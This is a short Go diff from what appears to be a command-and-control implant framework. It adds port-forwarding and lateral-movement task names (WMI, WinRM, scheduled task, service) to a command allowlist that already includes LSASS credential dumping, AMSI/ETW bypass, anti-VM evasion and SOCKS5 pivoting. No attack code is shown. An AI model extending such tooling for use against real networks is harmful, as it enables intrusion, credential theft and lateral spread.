@@ -541,10 +541,14 @@ func validateCommandForQueue(cmd *types.Command) error {
 		"bof_exec": true,
 		// phase 10 — OPSEC
 		"antidebug": true, "antivm": true, "timegate_set": true,
-		// phase 11 — network recon / registry / SOCKS5 pivot
+		// phase 11 — network recon / registry / SOCKS5 pivot / port forwarding
 		"net_scan": true, "arp_scan": true,
 		"reg_read": true, "reg_write": true, "reg_delete": true, "reg_list": true,
 		"socks5_start": true, "socks5_stop": true, "socks5_status": true,
+		"portfwd_start": true, "portfwd_stop": true,
+		// lateral movement
+		"lateral_wmi": true, "lateral_winrm": true,
+		"lateral_schtask": true, "lateral_service": true,
 		// extended techniques
 		"lsass_dump_dup": true, "lsass_dump_wer": true,
 		"amsi_hwbp": true, "etw_hwbp": true,
